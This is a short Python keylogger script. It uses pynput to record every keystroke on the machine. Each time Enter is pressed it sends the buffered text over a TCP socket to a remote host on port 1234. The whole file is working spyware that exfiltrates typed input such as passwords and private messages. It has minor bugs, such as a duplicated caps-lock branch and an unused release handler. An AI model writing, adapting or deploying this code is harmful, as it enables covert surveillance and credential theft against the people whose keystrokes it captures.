from time import sleep
from pynput.keyboard import Listener,Key
import socket

HOST=''
PORT=1234
message_container=[]

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

def on_press(key):
    try:
        if key == Key.space:
            pressed_key="<space>"
        elif key == Key.backspace:
            pressed_key="<backspace>"
        elif key == Key.ctrl:
            pressed_key="<Ctrl>"
        elif key == Key.caps_lock:
            pressed_key="<Ctrl>"
        elif key == Key.caps_lock:
            pressed_key="<caps_lock>"
        elif key == Key.shift:
            pressed_key ="<shift>"
        elif key == Key.esc:
            pressed_key ="<esc>"
        elif key == Key.enter:
            message="".join(message_container)
            sock.sendall(message.encode())
            message_container.clear()
        else:
            pressed_key=key.char
        try:
            message_container.append(pressed_key)
        except Exception:
            pass

    except Exception as E:
        print(f"Exception :{E}")

def on_release(key):
    try:
        if key != Key.esc:
            pass
        else:
            return False
        
    except Exception as E:
        print(f"Exception :{E}")       

listener=Listener(on_press=on_press)
listener.start()

try:
    while listener.running:
        sleep(0.1)

except KeyboardInterrupt:
    pass